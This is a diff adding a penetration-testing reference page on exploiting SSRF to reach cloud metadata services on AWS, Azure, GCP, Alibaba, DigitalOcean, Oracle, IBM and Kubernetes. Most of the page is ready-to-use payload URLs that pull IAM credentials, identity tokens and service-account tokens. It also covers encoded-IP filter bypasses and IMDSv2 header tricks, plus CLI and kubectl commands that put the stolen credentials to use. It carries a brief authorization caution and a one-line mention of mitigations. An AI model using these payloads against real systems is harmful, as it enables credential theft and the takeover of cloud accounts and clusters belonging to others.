@@ -1,0 +1,353 @@
+---
+title: Cloud metadata
+description: Reaching cloud instance metadata services through SSRF - AWS IMDS, Azure IMDS, GCP, Alibaba, DigitalOcean, Oracle, Kubernetes.
+mitre: [T1190, T1552.005]
+d3fend: [D3-NI, D3-OTF, D3-CE]
+impact: [CloudMetadata, CredentialTheft]
+sidebar:
+  order: 5
+  label: Cloud metadata
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Cloud-hosted apps run alongside an instance metadata service that's reachable only from the instance itself - including via SSRF. The metadata service exposes IAM credentials, network info, user-data scripts, and configuration. One SSRF on a cloud-hosted target frequently turns into full cloud account compromise.
+
+```bash
+# AWS (IMDSv1 - disable if hardened, but most legacy)
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Azure
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+# GCP
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+```
+
+Success indicator: JSON or text response containing IAM/identity tokens, instance metadata, or user-data scripts.
+
+## Why this matters
+
+The metadata service is the most consequential SSRF target on a cloud host. Reaching it means:
+
+- **AWS** → IAM role credentials → S3, EC2, Lambda, RDS, anything the role can do
+- **Azure** → managed identity tokens → resource access scoped to the identity
+- **GCP** → service account tokens → access to whatever Google APIs the SA has
+- **Kubernetes** → service account tokens → API server access scoped to the pod's role
+
+A modest read-only IAM role still reads S3 buckets. A typical app role reads/writes its own resources. An over-privileged role (common in legacy deployments) is account takeover.
+
+<Aside type="caution">
+Cloud metadata exfiltration is high-impact and high-noise. CloudTrail/Activity Log records every API call made with stolen credentials. If you're operating with permission, document carefully - both for the report and to prove which actions were yours during incident response. If you're not authorized, this is account compromise.
+</Aside>
+
+## AWS - Instance Metadata Service
+
+### IMDSv1 (legacy, no auth)
+
+Reachable from any process on the instance with a simple GET request. Most exposed systems still allow IMDSv1.
+
+```bash
+# Discover the IAM role attached to the instance
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns: <RoleName>
+
+# Fetch credentials for that role
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
+# Returns JSON:
+# {
+#   "AccessKeyId": "ASIA...",
+#   "SecretAccessKey": "...",
+#   "Token": "...",
+#   "Expiration": "..."
+# }
+```
+
+The credentials are temporary (typically ~6 hours) but full-strength while valid. Use them with the AWS CLI:
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+aws sts get-caller-identity
+aws s3 ls
+```
+
+### Other useful IMDS endpoints
+
+```bash
+# User data (often contains bootstrap scripts with secrets)
+?url=http://169.254.169.254/latest/user-data/
+
+# Instance identity
+?url=http://169.254.169.254/latest/meta-data/instance-id
+?url=http://169.254.169.254/latest/meta-data/hostname
+?url=http://169.254.169.254/latest/meta-data/public-hostname
+?url=http://169.254.169.254/latest/meta-data/local-hostname
+
+# Network
+?url=http://169.254.169.254/latest/meta-data/local-ipv4
+?url=http://169.254.169.254/latest/meta-data/public-ipv4
+?url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/
+
+# Security groups
+?url=http://169.254.169.254/latest/meta-data/security-groups
+
+# Region (useful for AWS CLI region setting)
+?url=http://169.254.169.254/latest/meta-data/placement/region
+```
+
+The full tree:
+
+```bash
+?url=http://169.254.169.254/latest/meta-data/
+# Returns top-level keys; recurse from there
+```
+
+### IMDSv2 (token-based, harder)
+
+IMDSv2 requires a `PUT` request to get a session token first, then `GET` with the token in a header. Two roadblocks for SSRF:
+
+1. **PUT method** - most SSRF wrappers only do GET
+2. **Custom header** - `X-aws-ec2-metadata-token-ttl-seconds`
+
+If the SSRF can do PUT and add headers, IMDSv2 still works:
+
+```bash
+# Step 1: get token
+?url=http://169.254.169.254/latest/api/token
+# (PUT, with header X-aws-ec2-metadata-token-ttl-seconds: 21600)
+
+# Step 2: use token
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# (with header X-aws-ec2-metadata-token: <TOKEN>)
+```
+
+When the SSRF is GET-only, IMDSv2 is generally not exploitable. Some applications proxy headers from the original request, in which case adding `X-aws-ec2-metadata-token: <token>` to your *outer* request gets it forwarded. Test before assuming.
+
+### IMDSv2 confused-deputy
+
+Some apps proxy specific headers but not method:
+
+```bash
+# Application takes a "method" parameter
+?url=http://169.254.169.254/latest/api/token&method=PUT&header=X-aws-ec2-metadata-token-ttl-seconds:21600
+```
+
+Look at the SSRF parameter's full surface - many implementations accept `headers[]`, `method`, `body` as additional parameters that get passed through.
+
+## Azure - Instance Metadata Service
+
+```bash
+# Same IP as AWS, different paths
+?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Header required: Metadata: true
+
+# Managed identity tokens
+?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com
+# Header required: Metadata: true
+# Returns: { "access_token": "...", "expires_in": "...", "resource": "https://management.azure.com" }
+```
+
+The `Metadata: true` header is mandatory. Without it, Azure returns 400. SSRFs that can't add custom headers don't work against Azure metadata.
+
+Use the token:
+
+```bash
+TOKEN="<access_token>"
+curl -H "Authorization: Bearer $TOKEN" \
+     "https://management.azure.com/subscriptions?api-version=2020-01-01"
+```
+
+### Azure resource targets
+
+```bash
+# Different resource = different scope
+&resource=https%3A%2F%2Fvault.azure.net          # Key Vault
+&resource=https%3A%2F%2Fstorage.azure.com         # Storage
+&resource=https%3A%2F%2Fgraph.microsoft.com       # Microsoft Graph
+```
+
+Request tokens for the resource you want to access. The managed identity may have different permissions per resource.
+
+## GCP - Metadata Server
+
+```bash
+# Different domain, header required
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Header required: Metadata-Flavor: Google
+
+# Returns:
+# {
+#   "access_token": "ya29...",
+#   "expires_in": 3599,
+#   "token_type": "Bearer"
+# }
+```
+
+Without the `Metadata-Flavor: Google` header, GCP returns 403. Same problem as Azure - SSRFs without custom headers can't reach it.
+
+### Useful GCP endpoints
+
+```bash
+# Service account email (which identity am I?)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+# Scopes (what can this token access?)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+
+# Project info
+?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
+?url=http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+
+# Custom metadata (often contains startup scripts)
+?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+
+# Recursive dump
+?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json
+```
+
+The recursive dump is the fastest way to understand what's available in one request.
+
+### GCP IP alternative
+
+`metadata.google.internal` resolves to `169.254.169.254`. If the filter blocks domain names but allows IPs, use the IP directly - same paths.
+
+## Other clouds
+
+### Alibaba Cloud
+
+```bash
+?url=http://100.100.100.200/latest/meta-data/                          # tree
+?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/<RoleName>
+```
+
+Different IP (`100.100.100.200`), no header required.
+
+### DigitalOcean
+
+```bash
+?url=http://169.254.169.254/metadata/v1/                               # tree
+?url=http://169.254.169.254/metadata/v1.json                           # all metadata as JSON
+?url=http://169.254.169.254/metadata/v1/user-data                       # user data
+```
+
+No tokens (DigitalOcean doesn't have IAM equivalent). Useful for SSH keys and user-data scripts.
+
+### Oracle Cloud (OCI)
+
+```bash
+?url=http://169.254.169.254/opc/v2/instance/                            # v2 (token-based)
+?url=http://169.254.169.254/opc/v1/instance/                            # v1 (legacy)
+```
+
+v2 requires `Authorization: Bearer Oracle` header.
+
+### IBM Cloud
+
+```bash
+?url=http://169.254.169.254/metadata/v1/instance?version=2022-03-29
+# Header required: Authorization: Bearer <token from PUT to /instance_identity/v1/token>
+```
+
+Token-based like AWS IMDSv2.
+
+## Kubernetes
+
+When the SSRF runs in a pod, the pod has a service account token mounted:
+
+```bash
+# Read the token via file:// schema (if available)
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
+
+# CA cert
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+
+# Namespace
+?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
+
+# API server reachable from pod
+?url=https://kubernetes.default.svc/api/v1/namespaces
+# Header required: Authorization: Bearer <token>
+```
+
+Use the token directly with `kubectl`:
+
+```bash
+TOKEN="<extracted token>"
+kubectl --server=https://<api-server> --token=$TOKEN --insecure-skip-tls-verify get pods --all-namespaces
+```
+
+A service account with `cluster-admin` (more common than it should be) is full cluster takeover. Even a namespace-scoped SA frequently has enough permissions to read secrets.
+
+## IP encoding bypass for metadata
+
+When `169.254.169.254` is filtered:
+
+```
+?url=http://2852039166/latest/meta-data/                    # decimal
+?url=http://0xa9fea9fe/latest/meta-data/                    # hex
+?url=http://0251.0376.0251.0376/latest/meta-data/           # octal
+?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/            # IPv6-mapped
+?url=http://169.254.169.254.nip.io/latest/meta-data/        # DNS
+?url=http://metadata.google.internal/...                    # GCP-only domain alias
+```
+
+See [filter bypass](/codex/web/server-side/ssrf/filter-bypass/) for the broader catalog.
+
+## Validating credentials
+
+Before celebrating, make sure the credentials work:
+
+<Tabs syncKey="cloud">
+<TabItem label="AWS">
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+
+aws sts get-caller-identity                     # confirm identity
+aws iam list-attached-role-policies --role-name <RoleName>  # what can it do
+aws s3 ls                                       # try the easy targets
+```
+
+</TabItem>
+<TabItem label="Azure">
+
+```bash
+TOKEN="<access_token>"
+curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
+curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/tenants?api-version=2020-01-01"
+```
+
+</TabItem>
+<TabItem label="GCP">
+
+```bash
+TOKEN="ya29..."
+curl -H "Authorization: Bearer $TOKEN" "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
+curl -H "Authorization: Bearer $TOKEN" "https://cloudresourcemanager.googleapis.com/v1/projects"
+```
+
+</TabItem>
+</Tabs>
+
+## Common failure modes
+
+- **AWS metadata returns nothing.** IMDSv2-only mode enforced (instance launched with `HttpTokens=required`). If the SSRF can't do PUT or set headers, AWS metadata is out of reach. Pivot to other internal services.
+- **Azure/GCP returns 400/403.** Required header (`Metadata: true`, `Metadata-Flavor: Google`) not being sent. Check whether the SSRF parameter accepts custom headers (some apps pass through `headers[]` arrays).
+- **Credentials work via `aws` CLI but every command fails with AccessDenied.** Role has minimal permissions - common for stripped-down app roles. Try the obvious resources (S3 buckets named after the company, the instance's own region resources). If everything is denied, the role really is just "describe self" and the chain stops here.
+- **Token expires mid-exploitation.** AWS tokens last ~6 hours, Azure ~24 hours, GCP ~1 hour. Re-fetch periodically. For long operations, dump the role policy first and plan the action set.
+- **Metadata reachable but kubectl fails with TLS errors.** Pod's CA cert isn't system-trusted. Use `--insecure-skip-tls-verify` or pass `--certificate-authority=<path-to-ca.crt>` from the file you exfiltrated.
+- **`metadata.google.internal` doesn't resolve.** App resolves DNS through a non-default resolver that doesn't know the metadata domain. Use the IP `169.254.169.254` directly.
+
+## Notes
+
+The single best habit on a cloud-hosted SSRF: try metadata first, before anything else. The payoff is enormous and the probe is one request. If it works, you're done with the section's first half - the rest of the engagement becomes "what does this IAM role have access to."
+
+The defender's mitigation is straightforward (IMDSv2-only on AWS, network policies on K8s, header requirements on Azure/GCP) but adoption is slow. Most engagements still land on legacy IMDSv1 or unhardened pod tokens.
